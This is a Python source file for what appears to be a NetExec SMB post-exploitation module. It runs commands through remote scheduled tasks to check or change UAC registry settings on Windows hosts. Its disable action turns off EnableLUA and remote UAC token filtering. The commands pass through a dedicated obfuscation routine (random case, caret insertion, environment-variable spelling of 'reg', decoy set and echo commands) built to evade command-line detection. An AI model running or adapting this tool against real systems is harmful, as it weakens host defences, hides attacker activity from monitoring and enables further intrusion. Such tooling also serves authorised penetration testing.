from nxc.protocols.smb.atexec import TSCH_EXEC  # Use TSCH_EXEC
from nxc.helpers.misc import CATEGORY
# from nxc.protocols.smb.smbexec import SMBEXEC - Removed
# from impacket.dcerpc.v5.rpcrt import DCERPCException - Removed
import random
import string


def randomize_case(s):
    """Randomizes the case of each character in a string."""
    return "".join(random.choice([c.upper(), c.lower()]) for c in s)


def obfuscate_cmd(command):
    """Obfuscates command by randomizing case, inserting carets, and using environment variable expansion."""
    # Randomly choose which characters to put carets before (avoiding existing carets)
    chars_to_escape = "^&|<>()@"
    potential_positions = [i for i, char in enumerate(command) if char in chars_to_escape and i > 0 and command[i - 1] != "^"]

    # Add carets to about 70% of escapable characters
    positions_to_caret = random.sample(potential_positions, int(len(potential_positions) * 0.7)) if potential_positions else []

    # Insert carets
    for pos in sorted(positions_to_caret, reverse=True):
        command = command[:pos] + "^" + command[pos:]

    # Replace common commands with randomized environment variables
    reg_cmd = "reg"
    query_cmd = "query"
    add_cmd = "add"
    system_path = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"

    # Split by spaces to avoid obfuscating inside quoted parts
    parts = []
    in_quote = False
    current_part = ""

    for char in command:
        if char == '"' and (not current_part or current_part[-1] != "^"):
            in_quote = not in_quote
            current_part += char
        elif char == " " and not in_quote:
            parts.append(current_part)
            current_part = ""
        else:
            current_part += char

    if current_part:
        parts.append(current_part)

    # Randomize case and apply other obfuscation to each part
    obfuscated_parts = []
    for part in parts:
        if part == reg_cmd:
            # 50% chance to use %__APPDATA:~-3,1%e%__APPDATA:~-3,1% instead of "reg"
            if random.random() > 0.5:
                obfuscated_parts.append(randomize_case(part))
            else:
                # Use environment variable substring extraction to spell 'reg'
                obfuscated_parts.append("%__APPDATA:~-3,1%e%__APPDATA:~-3,1%")
        elif part in (query_cmd, add_cmd):
            obfuscated_parts.append(randomize_case(part))
        elif system_path in part:
            # Keep paths as they are to not break functionality
            obfuscated_parts.append(part)
        elif "/v" in part or "/t" in part or "/d" in part or "/f" in part:
            # Randomize flags
            obfuscated_parts.append(randomize_case(part))
        else:
            obfuscated_parts.append(part)

    # Join parts back together
    obfuscated_cmd = " ".join(obfuscated_parts)

    # Add random set commands at the start 20% of the time
    if random.random() < 0.2:
        random_var = "".join(random.choice(string.ascii_uppercase) for _ in range(5))
        random_value = "".join(random.choice(string.ascii_uppercase) for _ in range(8))
        obfuscated_cmd = f"{randomize_case('set')} {random_var}={random_value} & {obfuscated_cmd}"

    return obfuscated_cmd


class NXCModule:
    """
    Module by @clandestine
    Uses TSCH_EXEC (atexec) and its built-in UAC bypass methods to modify UAC settings.
    """
    name = "uac_bypass"
    description = "Check or modify UAC settings using ATEXEC UAC bypass techniques"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION
    opsec_safe = False  # ATEXEC uses potentially unsafe UAC bypass methods
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None

    def options(self, context, module_options):
        """ACTION: "check" to view UAC settings, "disable" to disable UAC, or "enable" to enable UAC (required)."""
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            return

        if module_options["ACTION"].lower() not in ["check", "enable", "disable"]:
            context.log.fail("ACTION must be check, enable, or disable")
            return
        self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):

        # Initialize TSCH_EXEC class for execution
        try:
            context.log.debug("Initializing TSCH_EXEC method for UAC operations")
            exec_method = TSCH_EXEC(
                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                connection.smb_share_name,
                connection.username,
                connection.password,
                connection.domain,
                connection.kerberos,
                connection.aesKey,
                connection.host,
                connection.kdcHost,
                connection.hash,
                logger=context.log,
                tries=connection.args.get_output_tries,
                share=connection.args.share
            )
        except Exception as e:
            context.log.error(f"Failed to initialize TSCH_EXEC: {e}")
            return  # Cannot proceed without exec_method

        # Random string to use as a spacer
        spacer = f"::  ::: {''.join(random.choice('.*+') for _ in range(random.randint(5, 15)))} :::"

        # Define standard registry commands
        system_path = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        cmd_check = []
        cmd_disable = []
        cmd_enable = []

        # Check commands
        cmd_check.append(f'reg query "{system_path}" /v EnableLUA')
        cmd_check.append(f'reg query "{system_path}" /v ConsentPromptBehaviorAdmin')
        cmd_check.append(f'reg query "{system_path}" /v LocalAccountTokenFilterPolicy')

        # Disable commands
        cmd_disable.append(f'reg add "{system_path}" /v EnableLUA /t REG_DWORD /d 0 /f')
        cmd_disable.append(f'reg add "{system_path}" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f')

        # Enable commands
        cmd_enable.append(f'reg add "{system_path}" /v EnableLUA /t REG_DWORD /d 1 /f')
        cmd_enable.append(f'reg add "{system_path}" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f')
        cmd_enable.append(f'reg add "{system_path}" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f')

        # Determine the command to run based on action
        final_command = ""
        commands_to_run = []
        if self.action == "check":
            context.log.debug("Preparing registry query commands for UAC check")
            commands_to_run = cmd_check
            random.shuffle(commands_to_run)
        elif self.action == "disable":
            context.log.debug("Preparing commands to disable UAC")
            commands_to_run = cmd_disable
        elif self.action == "enable":
            context.log.debug("Preparing commands to enable UAC")
            commands_to_run = cmd_enable

        # Build the final command string (obfuscation is optional here, kept for consistency)
        # Re-enabled obfuscation temporarily as it was working before
        obfuscated_commands = []
        for cmd_item in commands_to_run:
            obfuscated_commands.append(obfuscate_cmd(cmd_item))
            if random.random() < 0.3:  # Add random echos back in
                obfuscated_commands.append(f"{randomize_case('echo')} {spacer}")
        final_command = f" {random.choice(['&', ';'])} ".join(obfuscated_commands)

        context.log.debug(f"Attempting to execute via TSCH_EXEC: {final_command}")
        output = None
        try:
            # Directly use TSCH_EXEC execute method
            output = exec_method.execute(final_command, True)
            if isinstance(output, bytes):
                try:
                    output = output.decode(connection.args.codec, errors="replace")
                except Exception as decode_err:
                    context.log.debug(f"Error decoding output: {decode_err}. Falling back to latin-1")
                    output = output.decode("latin-1", errors="replace")
        except Exception as exec_err:
            context.log.error(f"TSCH_EXEC execution failed: {exec_err}")
            # Proceed with output=None if execution itself failed

        # Process output based on action
        if self.action == "check":
            if output:
                context.log.success("UAC settings retrieved successfully:")
                for line in output.split("\n"):
                    line = line.strip()
                    if not line:
                        continue
                    context.log.debug(f"Processing line: {line}")
                    # Parse output (same logic as before)
                    if "EnableLUA" in line and "REG_DWORD" in line:
                        try:
                            value = line.split()[-1]
                            status = "Enabled" if value == "0x1" else "Disabled"
                            context.log.highlight(f"UAC Status: {status} (EnableLUA = {value})")
                        except IndexError:
                            context.log.debug(f"Could not parse EnableLUA from line: {line}")
                    elif "ConsentPromptBehaviorAdmin" in line and "REG_DWORD" in line:
                        try:
                            value = line.split()[-1]
                            behavior = "Unknown"
                            if value == "0x0":
                                behavior = "Elevate without prompting"
                            elif value == "0x1":
                                behavior = "Prompt for credentials on the secure desktop"
                            elif value == "0x2":
                                behavior = "Prompt for consent on the secure desktop"
                            elif value == "0x3":
                                behavior = "Prompt for credentials"
                            elif value == "0x4":
                                behavior = "Prompt for consent"
                            elif value == "0x5":
                                behavior = "Prompt for consent for non-Windows binaries"
                            context.log.highlight(f"Admin Prompt Behavior: {behavior} (ConsentPromptBehaviorAdmin = {value})")
                        except IndexError:
                            context.log.debug(f"Could not parse ConsentPromptBehaviorAdmin from line: {line}")
                    elif "LocalAccountTokenFilterPolicy" in line and "REG_DWORD" in line:
                        try:
                            value = line.split()[-1]
                            status = "Enabled (Remote UAC Restrictions Disabled)" if value == "0x1" else "Disabled (Remote UAC Restrictions Enabled)"
                            context.log.highlight(f"Remote UAC Filtering: {status} (LocalAccountTokenFilterPolicy = {value})")
                        except IndexError:
                            context.log.highlight("Remote UAC Filtering: Not Set (Defaults to Enabled)")
            else:
                context.log.fail("Failed to retrieve UAC settings or no output received.")

        elif self.action == "disable" or self.action == "enable":
            action_past_tense = "disabled" if self.action == "disable" else "enabled"
            if output and "successfully" in output.lower():
                context.log.success(f"UAC {action_past_tense} commands sent successfully! A system restart is required for changes to take effect.")
            else:
                # Check if output is None or empty, which might happen if exec_method failed
                if output is None:
                    context.log.fail(f"Failed to {self.action} UAC. Execution method failed.")
                else:
                    context.log.fail(f"Failed to {self.action} UAC. Output: {output}")
